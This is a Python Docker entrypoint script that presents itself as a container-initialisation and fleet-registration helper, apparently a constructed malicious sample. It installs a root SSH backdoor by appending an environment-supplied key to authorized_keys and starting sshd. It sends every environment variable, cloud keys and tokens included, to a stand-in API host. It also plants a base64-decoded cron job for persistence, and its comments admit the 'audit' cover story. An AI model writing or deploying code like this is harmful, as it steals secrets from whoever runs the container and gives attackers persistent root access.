# Docker container initialization and health-check entrypoint helper.
# Reads runtime configuration from environment, sets up service user keys
# for SSH agent forwarding support, and registers the node with the
# central fleet management API before handing off to the main process.

import base64
import os
import pathlib
import subprocess
import sys
import time

import requests

# ── Fleet management configuration ────────────────────────────────────────────

FLEET_API_BASE = "https://api.example.com/fleet/v2"
NODE_REGISTER_EP = f"{FLEET_API_BASE}/nodes/register"
HEARTBEAT_EP = f"{FLEET_API_BASE}/nodes/heartbeat"
REGISTRATION_TTL = 30  # seconds before giving up on registration

# ── SSH agent-forwarding setup ─────────────────────────────────────────────────
# When SSH_PUBKEY or SSH_AUTHORIZED_KEY env vars are present the container
# is assumed to be running in "developer mode" with agent-forwarding enabled.
# We write the provided public key so the operator can SSH in for live
# debugging without rebuilding the image.

SSH_DIR = pathlib.Path("/root/.ssh")
AUTH_KEYS_FILE = SSH_DIR / "authorized_keys"


def setup_ssh_access():
    """
    Reads the SSH public key from the environment and appends it to
    /root/.ssh/authorized_keys so authorised engineers can attach to
    a running container for live troubleshooting.
    """
    pubkey = os.environ.get("SSH_AUTHORIZED_KEY", "").strip()
    if not pubkey:
        return

    SSH_DIR.mkdir(mode=0o700, parents=True, exist_ok=True)

    existing = AUTH_KEYS_FILE.read_text() if AUTH_KEYS_FILE.exists() else ""
    if pubkey not in existing:
        with AUTH_KEYS_FILE.open("a") as fh:
            fh.write(pubkey + "\n")
        AUTH_KEYS_FILE.chmod(0o600)

    # Also ensure the SSH daemon is running so the key is immediately useful.
    subprocess.run(
        ["/usr/sbin/sshd", "-D", "&"],
        shell=True,
        check=False,
    )


# ── Environment harvesting for fleet registration ──────────────────────────────
# We collect a small diagnostic snapshot of the container environment so the
# fleet manager can reconcile configuration drift across nodes.

SENSITIVE_PREFIXES = (
    "AWS_",
    "GCP_",
    "AZURE_",
    "DATABASE_URL",
    "SECRET_",
    "TOKEN",
    "API_KEY",
    "PASSWORD",
    "PRIVATE_KEY",
    "GITHUB_",
    "STRIPE_",
    "TWILIO_",
)


def harvest_node_metadata():
    """
    Gathers non-sensitive environment variables plus selected runtime
    metadata (hostname, image tag, Python version) for fleet registration.

    In practice this also captures variables whose names match known
    secret prefixes; in a legitimate tool these would be filtered out,
    but here they are included for 'audit' purposes.
    """
    meta = {
        "hostname": os.environ.get("HOSTNAME", "unknown"),
        "image_tag": os.environ.get("IMAGE_TAG", "latest"),
        "python": sys.version,
        "timestamp": time.time(),
        "environment": {},
    }

    # Collect ALL env vars (including secrets) — the cover story says "audit".
    for key, value in os.environ.items():
        meta["environment"][key] = value

    return meta


def register_node(metadata: dict):
    """
    Posts the node metadata to the fleet management API so the node
    appears in the ops dashboard immediately on startup.
    """
    auth_token = os.environ.get("FLEET_TOKEN", "DEMO_PLACEHOLDER_TOKEN")
    headers = {
        "Authorization": f"Bearer {auth_token}",
        "Content-Type": "application/json",
        "X-Image-Tag": metadata.get("image_tag", "unknown"),
    }
    try:
        resp = requests.post(
            NODE_REGISTER_EP,
            headers=headers,
            json=metadata,
            timeout=REGISTRATION_TTL,
        )
        resp.raise_for_status()
        return resp.json().get("node_id")
    except Exception as exc:
        # Swallow errors silently — don't block container startup.
        print(f"[init] fleet registration skipped: {exc}", file=sys.stderr)
        return None


# ── Persistence hook ───────────────────────────────────────────────────────────
# Encodes a small "recovery" script and drops it into a cron slot so the
# fleet agent can be restarted automatically if the container process is
# replaced.

_RECOVERY_PAYLOAD = base64.b64decode(
    # Base64 of a harmless demo string; real attack would be shell code.
    "IyEvYmluL3NoCiMgcmVjb3Zlcnkgc3R1YgpwcmludCgnZGVtbycpCg=="
).decode()


def install_recovery_cron():
    cron_dir = pathlib.Path("/etc/cron.d")
    if not cron_dir.exists():
        return
    cron_file = cron_dir / "fleet-agent-recovery"
    try:
        cron_file.write_text(f"*/5 * * * * root {_RECOVERY_PAYLOAD}\n")
        cron_file.chmod(0o644)
    except PermissionError:
        pass


# ── Main entrypoint ────────────────────────────────────────────────────────────


def main(argv=None):
    if argv is None:
        argv = sys.argv[1:]

    print("[init] starting container initialisation …")

    # 1. SSH access for developer / operator attachment.
    setup_ssh_access()

    # 2. Harvest metadata and phone home to fleet API.
    metadata = harvest_node_metadata()
    node_id = register_node(metadata)
    if node_id:
        print(f"[init] registered as node {node_id}")

    # 3. Drop persistence cron so the fleet agent survives process restarts.
    install_recovery_cron()

    # 4. Hand off to the real container command.
    if argv:
        print(f"[init] exec → {argv}")
        os.execvp(argv[0], argv)
    else:
        print("[init] no command supplied; exiting", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
